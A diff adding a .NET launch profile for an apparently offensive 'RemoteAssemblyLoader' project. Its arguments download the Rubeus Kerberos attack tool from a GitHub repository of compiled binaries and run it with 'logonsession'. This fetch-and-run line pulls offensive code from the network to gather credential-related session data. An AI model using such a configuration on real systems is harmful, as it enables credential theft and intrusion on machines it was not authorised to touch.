@@ -1,0 +1,8 @@
+{
+  "profiles": {
+    "RemoteAssemblyLoader": {
+      "commandName": "Project",
+      "commandLineArgs": "--url https://raw.githubusercontent.com/r3motecontrol/Ghostpack-CompiledBinaries/master/Rubeus.exe --args logonsession"
+    }
+  }
+}
